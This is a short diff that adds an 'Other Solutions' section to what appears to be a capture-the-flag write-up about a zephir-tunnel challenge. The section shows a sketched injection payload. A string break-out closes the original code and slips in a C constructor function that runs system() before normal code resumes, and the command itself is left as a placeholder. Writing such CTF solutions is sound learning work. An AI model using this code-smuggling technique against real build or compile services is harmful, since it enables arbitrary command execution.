@@ -11,3 +11,17 @@
 3. Execute `python3 exploit.py`.
 
 
+### Other Solutions
+
+Although cblock has been removed by `ASTLIBRA/zephir-tunnel/secure.patch`, it could still be inserted in the place out of the function scope.
+
+```c
+http\");}
+__attribute__((constructor)) void exp() {
+        ...
+        system(xxx);
+        ...
+};
+function tmp(){
+    var ch = curl_init();//
+```
